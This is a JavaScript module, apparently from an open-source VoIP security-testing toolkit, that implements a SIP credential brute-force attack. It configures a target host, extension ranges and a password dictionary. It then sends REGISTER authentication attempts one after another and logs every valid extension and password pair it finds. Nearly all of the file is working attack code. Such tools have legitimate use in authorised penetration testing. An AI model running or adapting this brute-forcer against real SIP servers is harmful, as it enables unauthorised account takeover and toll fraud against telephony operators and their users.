// Copyright Jesus Perez <jesusprubio gmail com>
//           Sergio Garcia <s3rgio.gr gmail com>
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <http://www.gnu.org/licenses/>.

'use strict';


const async = require('async');
const SipFakeStack = require('sip-fake-stack');
const logger = require('../utils/logger');

module.exports.help = {
  description: 'SIP credentials brute-force',
  options: {
    target: {
      type: 'ip',
      description: 'Host to attack',
      defaultValue: '127.0.0.1',
    },
    // TODO: Coupled with the client
    // This order mandatory (between "transport" and "port" to try
    // to guess the porter when asking for the options
    transport: {
      type: 'transports',
      description: 'Underlying protocol',
      defaultValue: 'UDP',
    },
    port: {
      type: 'port',
      description: 'Port to attack on chosen IPs',
      defaultValue: 5060,
    },
    wsPath: {
      type: 'allValid',
      description: 'Websockets path (only when websockets)',
      defaultValue: 'ws',
    },
    meth: {
      type: 'sipRequests',
      description: 'Type of SIP packets to do the requests ("random" available)',
      defaultValue: 'REGISTER',
    },
    srcHost: {
      type: 'srcHost',
      description: 'Source host to include in the  SIP request ' +
                   '("external" and "random" supported)',
      defaultValue: 'iface:eth0',
    },
    srcPort: {
      type: 'srcPort',
      description: 'Source port to include in the  SIP request ("random" supported)',
      defaultValue: 'real',
    },
    domain: {
      type: 'domainIp',
      description: 'Domain to explore ("ip" to use the target)',
      defaultValue: 'ip',
    },
    extensions: {
      type: 'userPass',
      description: 'User (or file with them) to test',
      defaultValue: 'range:100-110',
    },
    passwords: {
      type: 'userPass',
      description: 'Password (or file with them) to test',
      defaultValue: 'file:artifacts/dics/john.txt',
    },
    userAsPass: {
      type: 'yesNo',
      description: 'Test the same user as password for each one.',
      defaultValue: 'yes',
    },
    delay: {
      type: 'positiveInt',
      description: 'Delay between requests, in ms.',
      defaultValue: 0,
    },
    timeout: {
      type: 'positiveInt',
      description: 'Time to wait for a response, in ms.',
      defaultValue: 5000,
    },
  },
};


module.exports.run = (options, callback) => {
  const result = {
    valid: [],
    errors: [],
  };
  let indexCountExt = 0; // Used with delay to know in which index we are
  let indexCountPass = 0;

  // We avoid to parallelize here to control the interval of the requests
  async.eachSeries(options.extensions, (extension, asyncCbExt) => {
    let finalPasswords = [];
    finalPasswords = finalPasswords.concat(options.passwords);
    indexCountExt += 1;
    if (options.userAsPass) {
      finalPasswords.push(extension);
    }

    async.eachSeries(finalPasswords, (passsword, asyncCbPass) => {
        // We use a new stack in each request to simulate different users
      const stackConfig = {
        server: options.target || null,
        port: options.port || '5060',
        transport: options.transport || 'UDP',
        timeout: options.timeout || 10000,
        wsPath: options.wsPath || null,
        srcHost: options.srcHost || null,
        lport: options.srcPort || null,
        domain: options.domain || null,
      };

      const msgConfig = {
        meth: options.meth,
        fromExt: extension,
        pass: passsword,
      };

      indexCountPass += 1;
      const fakeStack = new SipFakeStack(stackConfig);

      fakeStack.authenticate(msgConfig, (err, res) => {
        if (!err) {
          if (res.data.valid) {
            result.valid.push({
              extension,
              pass: passsword,
              data: res.data,
            });
            // We only add valid extensions to final result
            logger.highlight(`Valid credentials found: ${extension} | ${passsword}`);
          } else {
            // but we print info about tested ones
            logger.infoHigh(`Valid credentials NOT found for: ${extension} | ${passsword}`);
          }
          // Last element
          if (indexCountPass === finalPasswords.length &&
            indexCountExt === options.extensions.length) {
            asyncCbPass();
          } else {
            setTimeout(asyncCbPass, options.delay);
          }
        } else {
            // We don't want to stop the full chain
          result.errors.push({
            extension,
            pass: passsword,
            data: err,
          });
          asyncCbPass();
        }
      });
    }, () => {
      asyncCbExt();
    });
  }, err => {
    callback(err, result);
  });
};
